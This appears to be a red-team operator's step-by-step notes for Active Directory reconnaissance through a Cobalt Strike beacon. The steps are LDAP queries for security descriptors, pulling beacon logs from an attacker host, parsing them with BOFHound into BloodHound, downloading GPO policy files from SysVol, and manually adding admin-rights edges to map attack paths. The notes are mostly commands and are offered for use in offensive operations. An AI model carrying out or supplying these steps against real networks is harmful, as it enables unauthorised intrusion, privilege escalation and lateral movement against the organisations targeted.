gather information via LDAP:
  ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
  ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
copy logs to attacker desktop:
  scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
then parse with BOFHound:
  bofhound -i logs
run bloodhound then navigate to the UI
upload the json files that were output from BOFHound
inspect GPOs with:
  match (N:GPO) return N
click into any GPOs of interest (e.g. Workstation Admins) and note the Gpcpath 
  also note the object IDs of any affected computers!
using the beacon, let's find the policy files for the GPO:
  beacon> ls \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\
  beacon> download \\contoso.com\SysVol\contoso.com\Policies\{2583E34A-BBCE-4061-9972-E2ADAB399BB4}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
once downloaded, we can sync the file to our desktop (View > Downloads)'
reading this file shows us some group members which we can add manually to bloodhound:
  MATCH (x:Computer{objectid:'S-1-5-21-3926355307-1661546229-813047887-2101'}) //object ID we noted previously
  MATCH (y:Group{objectid:'S-1-5-21-3926355307-1661546229-813047887-1106'})  //object ID found in policy file
  MERGE (y)-[:AdminTo]->(x)
NOTE: do this for each object ID that we noted previously
